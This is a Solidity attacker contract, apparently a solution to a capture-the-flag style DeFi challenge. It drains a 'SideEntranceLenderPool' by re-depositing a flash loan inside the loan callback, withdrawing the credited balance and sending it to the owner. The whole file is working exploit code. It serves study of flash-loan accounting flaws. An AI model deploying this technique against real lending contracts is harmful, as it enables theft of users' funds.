pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    address lender;
    address owner;

    constructor(address _lender) {
        lender = _lender;
        owner = msg.sender;
    }

    function attack() public payable {
        SideEntranceLenderPool(lender).flashLoan(1000 ether);

        SideEntranceLenderPool(lender).withdraw();
        payable(owner).call{value: address(this).balance}("");
    }

    function execute() external payable {
        SideEntranceLenderPool(lender).deposit{value: msg.value}();
    }

    receive() external payable {}
}
